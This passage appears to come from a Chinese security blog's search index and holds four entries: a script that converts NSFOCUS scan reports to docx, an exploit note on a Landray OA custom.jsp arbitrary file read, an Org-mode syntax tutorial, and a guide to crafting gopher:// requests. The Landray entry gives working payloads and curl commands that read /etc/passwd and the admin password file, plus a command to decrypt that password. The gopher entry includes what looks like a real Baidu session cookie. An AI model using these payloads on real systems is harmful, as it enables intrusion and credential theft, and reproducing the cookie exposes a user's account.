        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>日常安全扫描场景中，有需要将绿盟的Web漏扫报告(html)转换成docx文档格式的需求，<br>因此使用python3写了个脚本，使用模块如下</p><ul><li>BeautifulSoup</li><li>docxtpl</li></ul><h2 id="原始报告"><a href="#原始报告" class="headerlink" title="原始报告"></a>原始报告</h2><p><img src="https://raw.githubusercontent.com/askDing/Nsfocus2docx/main/img/nsfocus_html.png" alt="html"></p><h2 id="转换成docx报告"><a href="#转换成docx报告" class="headerlink" title="转换成docx报告"></a>转换成docx报告</h2><p><img src="https://raw.githubusercontent.com/askDing/Nsfocus2docx/main/img/nsfocus_docx.png" alt="docx"></p><h2 id="源码Nsfocus2docx"><a href="#源码Nsfocus2docx" class="headerlink" title="源码Nsfocus2docx"></a>源码<a href="https://github.com/askDing/Nsfocus2docx">Nsfocus2docx</a></h2><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-# author: Mr.Frame# Blog: https://askding.github.io/# Dependence:#           BeautifulSoup#           docxtpl# Bugs:#  doc.render(data) 渲染数据时，#  199个漏洞，只能渲染89个，#  1362个漏洞只能渲染出639个import sysimport timefrom bs4 import BeautifulSoupfrom docxtpl import DocxTemplate# 定义漏洞类class Vulner:    def __init__(self, vulnName, ipList, details, threatLevel, solutions):        self.vulnName = vulnName        self.ipList = ipList        self.detail = details        self.threatLevel = threatLevel        self.solution = solutionsdef banner():    if len(sys.argv) != 2:        print(&quot; Usage: python3 main.py  &lt;path/to/index.html&gt;  &quot;)        sys.exit()def generate_docx(path):    data = &#123;&quot;vulners&quot;: []&#125;  # 漏洞数据    soup = BeautifulSoup(open(path), &quot;lxml&quot;)    data[&#39;title&#39;] = soup.h1.string  # 文档标题    generated_dox = data[&#39;title&#39;] + time.strftime(&quot;%Y-%m-%d&quot;, time.localtime()) + &quot;.docx&quot;  # 生成文档名    vuln_table = soup.find(&#39;table&#39;, attrs=&#123;&quot;id&quot;: &quot;vuln_distribution&quot;,                                           &quot;class&quot;: &quot;report_table&quot;&#125;)    # 获取漏洞名列表    vuln_name_list = vuln_table.find_all(&#39;span&#39;)    # 获取每个漏洞名字下展开信息    report_table_list = vuln_table.find_all(&#39;table&#39;, attrs=&#123;&quot;class&quot;: &quot;report_table&quot;&#125;)    vuln_List=[]         # 漏洞名字列表    print(&quot;\n梳理漏洞如下: &quot;)    for vul in vuln_name_list:        vuln_name = vul.get_text().strip()  # 漏洞名列表        print(vuln_name)        vuln_List.append(vuln_name)    vuln_Hosts=[]        # 风险来源列表    Detail_List=[]       # 风险分析列表    Solution_List=[]     # 处置建议列表    ThreatLevel_List=[]  # 风险级别列表    for report_table in report_table_list:        vuln_hosts = report_table.find_all(&quot;td&quot;)[0].get_text()  # 风险来源        vuln_hosts = vuln_hosts.replace(&quot;&amp;nbsp&quot;, &quot;&quot;).replace(&quot;点击查看详情;&quot;, &quot;&quot;)        detail = report_table.find_all(&quot;td&quot;)[1].get_text()  # 风险分析        solution = report_table.find_all(&quot;td&quot;)[2].get_text().strip()  # 处置建议        threatLevel = report_table.find_all(&quot;td&quot;)[3].get_text()  # 风险级别        vuln_Hosts.append(vuln_hosts)        Detail_List.append(detail)        Solution_List.append(solution)        ThreatLevel_List.append(threatLevel)    for i in range(0,len(vuln_List)):        print(i)        data[&#39;vulners&#39;].append(            Vulner(vuln_List[i], vuln_Hosts[i], Detail_List[i], ThreatLevel_List[i], Solution_List[i])        )    print(&quot;文档原始数据生成中...&quot;)    doc = DocxTemplate(&quot;template.docx&quot;)    print(&quot;正在渲染文档数据....&quot;)    doc.render(data)    doc.save(generated_dox)    print(&quot;生成完毕，文档名: &#123;&#125;&quot;.format(generated_dox))if __name__ == &#39;__main__&#39;:    banner()    generate_docx(sys.argv[1])</code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre><code class="zsh">python3 Nsfocus2docx  /path/to/NS_report/index.html</code></pre><h2 id="已知Bug"><a href="#已知Bug" class="headerlink" title="已知Bug"></a>已知Bug</h2><p><code>doc.render(data)</code>渲染数据时，</p><ul><li>199个漏洞，只能渲染89个，</li><li>1362个漏洞只能渲染出639个</li></ul><p>欢迎For，PR</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Landray-OA 蓝凌OA custom.jsp页面任意文件读取</title>
      <link href="Kali/Exploit/Landray-OA.html"/>
      <url>Kali/Exploit/Landray-OA.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="蓝凌OA-custom-jsp页面任意文件读取"><a href="#蓝凌OA-custom-jsp页面任意文件读取" class="headerlink" title="蓝凌OA custom.jsp页面任意文件读取"></a>蓝凌OA custom.jsp页面任意文件读取</h1><ul><li>URI: <code>/sys/ui/extend/varkind/custom.jsp</code></li><li>payload: <pre><code class="zsh">var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;file:///etc/passwd&quot;&#125;&#125;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/kmssconfig.properties&quot;&#125;&#125;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/admin.properties&quot;&#125;&#125;</code></pre></li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ol><li>查看kmssconfig配置文件<pre><code class="zsh">curl -X POST &quot;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp&quot; -d &#39;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/kmssconfig.properties&quot;&#125;&#125;&#39;</code></pre></li></ol><p><img src="https://raw.githubusercontent.com/askDing/PicGo/main/images/20210513194553landray-oa.png" alt="Landray-OA"></p><ol start="2"><li>查看<code>/admin.do</code>管理员后台密码<pre><code class="zsh">curl -X POST &quot;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp&quot; -d &#39;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/admin.properties&quot;&#125;&#125;&#39;</code></pre></li></ol><p>解密工具 <a href="https://github.com/zhutougg/LandrayDES">LandrayDES</a></p><pre><code class="zsh">java -jar LandrayDES-0.0.1-SNAPSHOT-jar-with-dependencies.jar Decrypt  admin.do S11E7bclfCnWEz/\JLVTdUw==</code></pre><p>参考</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247485442&idx=1&sn=18175fcffeb5ccf31507a21f30145ddd&chksm=e869eb6fdf1e62793669c3e91b011034dfa7c11d0af173d9541be384e6606f64be0a93c1d5f5&xtrack=1&scene=90&subscene=93&sessionid=1620912773&clicktime=1620912781&enterid=1620912781&ascene=56&devicetype=android-30&version=28000339&nettype=WIFI&abtest_cookie=AAACAA==&lang=en&exportkey=AUeLnswx+FALMw29vTEa4+g=&pass_ticket=77Y82XyXpJKzg8bEukNk8K1Ac4jfOpASkJgWWfxkZ8QI4Er3daOMJ3T9fBFJHbz2&wx_header=1">X凌OA任意文件读取</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>org-syntax</title>
      <link href="Evolution/org-syntax.html"/>
      <url>Evolution/org-syntax.html</url>
      
        <content type="html"><![CDATA[<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org1f2e3d0">Org Mode - Your life in plain text</a><ol><li> <a href="#org22e2b21">Metadata</a></li><li> <a href="#orgf520299">Headlines</a></li><li> <a href="#orgca6af80">Markup</a></li><li> <a href="#org08cbd90">Lists</a></li><li> <a href="#org29a3a9a">Links</a></li><li> <a href="#org4616742">Images</a></li><li> <a href="#org51f208e">Blocks</a></li><li> <a href="#org617375d">Table</a></li><li> <a href="#orga1ab3ca">Commnet</a></li><li><a href="#org3561d83">Macros</a></li><li><a href="#org6c0fec9">footnotes</a></li></ol></li></ol><p><a id="org1f2e3d0"></a></p><h1 id="Org-Mode-Your-life-in-plain-text"><a href="#Org-Mode-Your-life-in-plain-text" class="headerlink" title="Org Mode - Your life in plain text"></a>Org Mode - Your life in plain text</h1><p>Org is a highly flexible structured plain text file format, composed of a few simple, yet versatile, structures &#x2013; constructed to be both <strong>simple enough for the novice</strong> and <strong>powerful enough for the expert</strong>.</p><p>Org mode is Emacs major mode for convenient plain text markup,is for </p><ul><li>  keeping notes,</li><li>  maintaining to-do lists,</li><li>  planning projects,</li><li>  authoring documents,</li><li>  computational notebooks,</li><li>  literate programming</li><li>  and more</li></ul><p>in a fast and effective plain text system.</p><p><a id="org22e2b21"></a></p><h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><p>At the start of a file(before the first headline), it’s common to set the title, author and other <strong>export options</strong></p><pre><code>#+title: Example Org File#+author: Mr.Frame#+date: Fri May  7 10:07:35 CST 2021#+startup: overview content showall showeverything nohideblocks  hideblocks</code></pre><p><a id="orgf520299"></a></p><h2 id="Headlines"><a href="#Headlines" class="headerlink" title="Headlines"></a>Headlines</h2><p>Lines that start with an asterisk <code>*</code> are <strong>headlines</strong><br>A single <code>*</code> denotes a 1st-level headline</p><pre><code>* Revamp orgmode.org website** Make screenshots</code></pre><p><a id="orgca6af80"></a></p><h2 id="Markup"><a href="#Markup" class="headerlink" title="Markup"></a>Markup</h2><p>Text markup follows th pattern,  PRE, MARKER, CONTENTS, MARKER and POST are not separated by whitespace characters.<br><code>&lt;Pre&gt;&lt;Marker&gt;&lt;Contents&gt;&lt;Marker&gt;&lt;Post&gt;</code></p><ul><li>  <Pre>: - ( { ' " and whitespace<sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>,</li><li>  <Marker>: a character among *(bold), =(verbatim), /(italic), +(strikethrough), _(underline), ~(code)</li><li>  <Post>: <whitespace character>,- . , ; : ! ? ‘ “ ) } [</li><li>  <Contents>: <code>&lt;non-whitespace-character&gt;&lt;any character but may not span over more than 3 lines&gt;&lt;non-whitespace-character&gt;</code></li></ul><table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides"><colgroup><col  class="org-left" /><col  class="org-left" /><col  class="org-left" /></colgroup><thead><tr><th scope="col" class="org-left">Font Style</th><th scope="col" class="org-left">Singal</th><th scope="col" class="org-left">Effect</th></tr></thead><tbody><tr><td class="org-left">Bold</td><td class="org-left"><code>*Bold*</code></td><td class="org-left"><b>Bold</b></td></tr><tr><td class="org-left">Italic</td><td class="org-left"><code>/Italic/</code></td><td class="org-left"><i>Italic</i></td></tr><tr><td class="org-left">Underline</td><td class="org-left"><code>_underline_</code></td><td class="org-left"><span class="underline">underline</span></td></tr><tr><td class="org-left">Strikethrough</td><td class="org-left"><code>+strikethrough+</code></td><td class="org-left"><del>strikethrough</del></td></tr><tr><td class="org-left">code</td><td class="org-left"><code>~code~</code></td><td class="org-left"><code>code</code></td></tr><tr><td class="org-left">verbatim</td><td class="org-left"><code>=verbatim=</code></td><td class="org-left"><code>berbatim</code></td></tr><tr><td class="org-left">Superscripts</td><td class="org-left"><code>R_sun=6.96 x 10^8m</code></td><td class="org-left">R<sub>sun</sub>=6.96 x 10<sup>8m</sup></td></tr><tr><td class="org-left">Subscripts</td><td class="org-left"><code>R_&#123;AlphaCentauri&#125; = 1.28 x R_&#123;sum&#125;</code></td><td class="org-left">R<sub>AlphaCentauri</sub> = 1.28 x R<sub>sum</sub></td></tr></tbody></table><p><a id="org08cbd90"></a></p><h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><p>Unordered lists start with + -<br>Ordered lists start with 1. 1)  A.  A)<br>Unordered and odered bullets can be nested in any order.</p><pre><code>To buy:1. Milk2. Eggs  - Organic3. Cheese  + Parmesan  + MozzarellaLists can contain checkboxes [ ] [-] [X]- [ ] not started- [-] in progress- [X] complete Lists can contain tags (and checkboxes at the same time)- [ ] fruits :: get apples- [X] vegiies :: get carrots</code></pre><p><a id="org29a3a9a"></a></p><h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p>put the target between two square brackets,like so: <code>[[type:target]]</code> or <code>[[type:target][desc]]</code><br>same as an html <code>&lt;a&gt;</code> tag <code>&lt;a href=&quot;target&quot;&gt;desc&lt;/a&gt;</code></p><pre><code>[[https://orgmode.org][a nice website]][[file:~/Pictures/dank-emem.png]][[earlier heading][an earlier heading in the document]]</code></pre><p><a id="org4616742"></a></p><h2 id="Images"><a href="#Images" class="headerlink" title="Images"></a>Images</h2><p>Org mode automatically recognizes and renders image links during export.<br>Just link to an image <strong>(don’t include a description)</strong>.   </p><p><code>[[https://upload.wikimedia.org/wikipedia/commons/5/5d/Konigsberg_bridges.png]]</code>  </p><p>Images located on your computer can also be rendered in the Emacs buffer with <strong><code>C-c C-x C-v</code></strong></p><p><a id="org51f208e"></a></p><h2 id="Blocks"><a href="#Blocks" class="headerlink" title="Blocks"></a>Blocks</h2><p>Org mode uses <strong>#+BEGIN</strong> &#x2026; <strong>#+END</strong> blocks for many purposes. </p><pre><code>(defun org-xor (a b)   &quot;Exclusive or.&quot;   (if a (not b) b))</code></pre><p><a id="org617375d"></a></p><h2 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h2><pre><code>| Tool         | Literate programming? | Reproducible Research? | Languages ||--------------+-----------------------+------------------------+-----------|| Javadoc      | partial               | no                     | Java      || Haskell .lhs | partial               | no                     | Haskell   || noweb        | yes                   | no                     | any       || Sweave       | partial               | yes                    | R         || Org-mode     | yes                   | yes                    | any       |</code></pre><p><a id="orga1ab3ca"></a></p><h2 id="Commnet"><a href="#Commnet" class="headerlink" title="Commnet"></a>Commnet</h2><ul><li><p>  Line comments start with <strong>#</strong></p></li><li><p>  Inline comments wrap <code>@@comment: like so@@</code></p></li><li><p>  Block comments are wrapped with <strong><code>#+BEGIN_COMMENT</code></strong> and <strong><code>#+END_COMMENT</code></strong></p></li><li><p>Section comments can be created by adding the <strong>COMMENT</strong> keyword to a headline</p><pre><code>    # A line commment    Example of an @@comment: inline@@ comment.</code></pre></li></ul><pre><code>      #+begin_comment      This is a block comment.      It can span multiple line.      As well as other markup.      #+begin_src emacs-lisp      (+ 1 2)      #+end_src      #+end_comment      * A top level headline      ** COMMENT This section and subsections are commented out      *** This headline inherits the =COMMENT= keyword    This text is commented out      ** This headline is not commented</code></pre><p><a id="org3561d83"></a></p><h2 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h2><pre><code>#+macro: attn _*/$1/*_&#123;&#123;&#123;attn(This text gets all the markup!)&#125;&#125;&#125;</code></pre><p><span class="underline"><strong><em>Attention! This text gets all the markup!</em></strong></span> _ this will underline_</p><p><a id="org6c0fec9"></a></p><h2 id="footnotes"><a href="#footnotes" class="headerlink" title="footnotes"></a>footnotes</h2><ul><li><p>  <code>[fn:name:description]</code></p></li><li><p>  <code>[fn::description]</code></p></li><li><p><code>[fn:name2]</code></p><p>  <code>[fn:name2] description</code></p><p>  ** Footnotes<br>  The Org homepage[fn:1] now looks a lot better than it used to.</p><p>  Tom is a boy[fn:name]. </p><p>  Jim is a boy[fn:: This is the inline definition of this footnote] too.</p><p>  Lily is a girl[fn:lily: a definition].</p></li></ul><pre><code>[fn:1] The link is: http://orgmode.org[fn:name] Tom is a boy.</code></pre><h1 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h1><p><sup><a id="fn.1" href="#fnr.1">1</a></sup> \space \tab \enter</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Gopher</title>
      <link href="Kali/Exploit/Gopher-md.html"/>
      <url>Kali/Exploit/Gopher-md.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#orgb2c70fa">Gopher</a><ol><li> <a href="#org7cb8b1b">发送gopher请求</a></li><li> <a href="#orgd7c10bf">发送GET请求</a></li><li> <a href="#org085483d">发送POST请求</a></li></ol></li></ol><p><a id="orgb2c70fa"></a></p><h1 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h1><pre><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_[TCP/IP数据]  默认端口70</code></pre><p>发起post请求，回车换行需要使用`%0d%0a`，如果多个参数，参数之间的&amp;也需要进行URL编码</p><p>gopher会将后面的数据部分发送给相应的端口，<br>这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等<br>，同时数据部分必须要进行**URL编码**，这样gopher协议才能正确解析。</p><p><a id="org7cb8b1b"></a></p><h2 id="发送gopher请求"><a href="#发送gopher请求" class="headerlink" title="发送gopher请求"></a>发送gopher请求</h2><pre><code>curl gopher://www.example.com/path/_[file]curl gopher://192.168.43.26:8888/_Hi%0aNewLine%0aThere</code></pre><p><a id="orgd7c10bf"></a></p><h2 id="发送GET请求"><a href="#发送GET请求" class="headerlink" title="发送GET请求"></a>发送GET请求</h2><pre><code>    GET / HTTP/1.1    Host: baidu.com    Upgrade-Insecure-Requests: 1    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9    Accept-Encoding: gzip, deflate    Accept-Language: en-US,en;q=0.9    Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS    Connection: close</code></pre><ol><li><p>URL全编码1次HTTP请求包</p><p> <code>%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a</code></p></li></ol><p><img src="https://raw.githubusercontent.com/askDing/PicGo/main/images/20210506104027urlencode_all.png" alt="img"></p><ol><li> 将URL全编码后的HTTP请求包的字符串附加到`_`后</li></ol><pre><code class="zsh">    curl -v gopher://127.0.0.1/_%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a    ❯ nc -lvv 70      GET / HTTP/1.1    Host: baidu.com    Upgrade-Insecure-Requests: 1    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9    Accept-Encoding: gzip, deflate    Accept-Language: en-US,en;q=0.9    Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS    Connection: close</code></pre><p><a id="org085483d"></a></p><h2 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h2><p>必须参数`POST`、`Host`、`Content-Type`、`Content-Length`、、</p><pre><code>POST /v1/pages HTTP/2Host: content-autofill.googleapis.comX-Goog-Encode-Response-If-Executable: base64X-Goog-Api-Key: dummytokenX-Client-Data: COrfygE=Sec-Fetch-Site: noneSec-Fetch-Mode: no-corsSec-Fetch-Dest: emptyUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 9alt=proto</code></pre><ol><li><p> URL全编码HTTP请求包</p></li><li><p> 将URL全编码后的HTTP请求包的字符串附加到`_`后</p></li></ol><pre><code class="zsh">    curl -v gopher://127.0.0.1/_%50%4f%53%54%20%2f%76%31%2f%70%61%67%65%73%20%48%54%54%50%2f%32%0d%0a%48%6f%73%74%3a%20%63%6f%6e%74%65%6e%74%2d%61%75%74%6f%66%69%6c%6c%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%0d%0a%58%2d%47%6f%6f%67%2d%45%6e%63%6f%64%65%2d%52%65%73%70%6f%6e%73%65%2d%49%66%2d%45%78%65%63%75%74%61%62%6c%65%3a%20%62%61%73%65%36%34%0d%0a%58%2d%47%6f%6f%67%2d%41%70%69%2d%4b%65%79%3a%20%64%75%6d%6d%79%74%6f%6b%65%6e%0d%0a%58%2d%43%6c%69%65%6e%74%2d%44%61%74%61%3a%20%43%4f%72%66%79%67%45%3d%0d%0a%53%65%63%2d%46%65%74%63%68%2d%53%69%74%65%3a%20%6e%6f%6e%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%4d%6f%64%65%3a%20%6e%6f%2d%63%6f%72%73%0d%0a%53%65%63%2d%46%65%74%63%68%2d%44%65%73%74%3a%20%65%6d%70%74%79%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%3